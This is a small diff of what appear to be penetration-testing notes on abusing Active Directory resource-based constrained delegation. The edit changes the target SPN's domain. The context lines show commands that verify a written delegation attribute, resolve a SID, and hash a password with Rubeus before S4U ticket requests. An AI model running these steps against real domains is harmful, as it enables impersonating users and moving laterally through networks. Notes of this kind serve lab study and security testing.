@@ -36,7 +36,7 @@ VERIFICATION THAT WE SUCCESSFULLY WROTE THE "msds-allowedtoactonbehalfofotheride
 	
  4. `ConvertFrom-SID sid_number`  -> this must return us with: contoso\myComputer$
 	
-NOW WE WILL REQUEST A TGS FOR THE SPN: "CIFS/appsrv01.prod.corp1.com" USING RUBEUS AND THE S4USELF AND S4UPROXY(this part is very similar to constrained delegation)
+NOW WE WILL REQUEST A TGS FOR THE SPN: "CIFS/appsrv01.contoso.com" USING RUBEUS AND THE S4USELF AND S4UPROXY(this part is very similar to constrained delegation)
 	
  1. `.\Rubeus.exe hash /password:h4x`
 	
